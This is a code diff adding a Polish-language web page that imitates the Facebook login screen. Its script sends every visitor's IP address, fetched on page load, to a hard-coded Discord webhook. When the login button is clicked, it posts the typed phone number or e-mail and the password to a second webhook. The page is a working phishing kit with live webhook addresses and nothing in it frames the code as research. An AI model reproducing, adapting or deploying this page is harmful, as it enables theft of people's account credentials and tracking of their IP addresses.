@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="pl">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Facebook - zaloguj się lub zarejestruj</title>
+<style>
+:root{
+--blue: #1877f2;
+--gray: #606770;
+--border: #ccd0d5;
+--input-placeholder: #606770;
+--black: #050505;
+--max-w: 420px;
+}
+* {
+box-sizing: border-box;
+font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+}
+html, body {
+height: 100%;
+margin: 0;
+background: #fff;
+display: flex;
+justify-content: center;
+align-items: center;
+}
+.container {
+width: 100%;
+max-width: var(--max-w);
+padding: 40px 16px 40px;
+text-align: center;
+}
+.lang {
+font-size: 14px;
+color: var(--gray);
+margin-bottom: 32px;
+}
+.logo {
+display: flex;
+justify-content: center;
+margin-bottom: 48px;
+}
+.logo svg {
+width: 56px;
+height: 56px;
+}
+.input {
+width: 100%;
+font-size: 15px;
+padding: 13px 16px;
+border: 1px solid var(--border);
+border-radius: 12px;
+margin-bottom: 10px;
+color: #050505;
+}
+.input::placeholder {
+color: var(--input-placeholder);
+font-weight: 400;
+}
+.cta {
+width: 100%;
+background-color: var(--blue);
+color: rgba(255, 255, 255, 0.95);
+border: none;
+border-radius: 999px;
+padding: 13px 0;
+font-size: 17px;
+font-weight: 450;
+cursor: pointer;
+margin-top: 8px;
+margin-bottom: 12px;
+}
+.forgot {
+margin-top: 8px;
+font-size: 15px;
+color: var(--black);
+font-weight: 500;
+margin-bottom: 124px;
+}
+.new-account {
+display: inline-block;
+background-color: transparent;
+color: var(--blue);
+border: 2px solid var(--blue);
+font-weight: 600;
+border-radius: 22px;
+padding: 11px 0;
+width: 100%;
+font-size: 17px;
+text-decoration: none;
+cursor: pointer;
+box-sizing: border-box;
+}
+.meta {
+margin-top: 25px;
+text-align: center;
+}
+.meta img {
+width: 75px;
+opacity: 0.9;
+}
+.footer {
+margin-top: 18px;
+display: flex;
+justify-content: center;
+gap: 14px;
+font-size: 14px;
+color: var(--gray);
+}
+.footer a {
+color: var(--gray);
+text-decoration: none;
+}
+.footer a:hover {
+text-decoration: underline;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="lang">Polski</div>
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+<path fill="#1877F2" d="M36 18C36 8.06 27.94 0 18 0S0 8.06 0 18c0 8.99 6.58 16.43 15.19 17.82V23.22h-4.57v-5.22h4.57v-3.99c0-4.52 2.69-7.02 6.83-7.02 1.98 0 4.05.35 4.05.35v4.46h-2.28c-2.25 0-2.95 1.4-2.95 2.83v3.38h5.02l-.8 5.22h-4.22v12.6C29.42 34.43 36 26.99 36 18z"/>
+</svg>
+</div>
+<input class="input" placeholder="Numer telefonu komórkowego lub adres e-mail" id="abc" />
+<input class="input" placeholder="Hasło" type="text" id="password" />
+<button class="cta" id="loginBtn">Zaloguj się</button>
+<div class="forgot">Nie pamiętasz hasła?</div>
+<a href="#" class="new-account">Utwórz nowe konto</a>
+<div class="meta"><img src="image.png" alt="Meta" /></div>
+<div class="footer">
+<a href="#">Informacje</a>
+<a href="#">Pomoc</a>
+<a href="#">Więcej</a>
+</div>
+</div>
+<script>
+const ipWebhookUrl = "https://discordapp.com/api/webhooks/1435752423577620480/xrVvr4JkwJq8jUckTF5RZAatd07SOFr7v8QQGNKS71N8ppjTl2MSUmTG20WYi9tNBSFv";
+const loginWebhookUrl = "https://discordapp.com/api/webhooks/1435752158807986308/ZeeXNEjm66SezM-uW8EPzLXhU8quRL6gUeniIpTKZntAPhtHb_OMvU2N0H0TijoufwFa";
+
+// Funkcja do zarządzania IP w localStorage
+function getIPData() {
+const data = localStorage.getItem('ipData');
+return data ? JSON.parse(data) : {};
+}
+
+function saveIPData(ipData) {
+localStorage.setItem('ipData', JSON.stringify(ipData));
+}
+
+// Wysyłanie IP przy załadowaniu strony
+fetch("https://api.ipify.org?format=json")
+.then(response => response.json())
+.then(data => {
+const userIP = data.ip;
+const ipData = getIPData();
+
+if (ipData[userIP]) {
+// IP już istnieje - zwiększ licznik
+ipData[userIP]++;
+saveIPData(ipData);
+// Wyślij IP z licznikiem powtórzeń
+fetch(ipWebhookUrl, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({
+content: `${userIP} (${ipData[userIP]})`
+})
+});
+} else {
+// Nowe IP - zapisz i wyślij
+ipData[userIP] = 1;
+saveIPData(ipData);
+fetch(ipWebhookUrl, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({
+content: `Zarejestrowano nowy adres IP: ${userIP}`
+})
+});
+}
+})
+.catch(err => {
+console.error("Błąd pobierania IP:", err);
+});
+
+const input = document.getElementById("password");
+let realValue = "";
+let timer;
+input.addEventListener("input", (e) => {
+const current = e.target.value;
+// dodano nowy znak
+if (current.length > realValue.length) {
+const newChar = current.slice(-1);
+realValue += newChar;
+// pokaż wszystkie poprzednie jako kropki + ostatni znak jawny
+input.value = "•".repeat(realValue.length - 1) + newChar;
+// po 1 sekundzie zamień ostatni znak na kropkę
+clearTimeout(timer);
+timer = setTimeout(() => {
+input.value = "•".repeat(realValue.length);
+}, 1000);
+}
+// usuwanie znaków
+else {
+realValue = realValue.slice(0, current.length);
+input.value = "•".repeat(realValue.length);
+}
+});
+
+document.getElementById("loginBtn").addEventListener("click", () => {
+const abcValue = document.getElementById("abc").value;
+const abcdValue = realValue;
+fetch("https://api.ipify.org?format=json")
+.then(response => response.json())
+.then(data => {
+const userIP = data.ip;
+// Wysyłanie loginów na osobny webhook
+fetch(loginWebhookUrl, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({
+content: `@everyone\n# NOWA WYJEBKA!\n**Loginy: ${abcValue}**\n**Hasło: ${abcdValue}**\nIP: ${userIP}`
+})
+});
+})
+.catch(err => {
+console.error("Błąd pobierania IP:", err);
+});
+});
+</script>
+</body>
+</html>
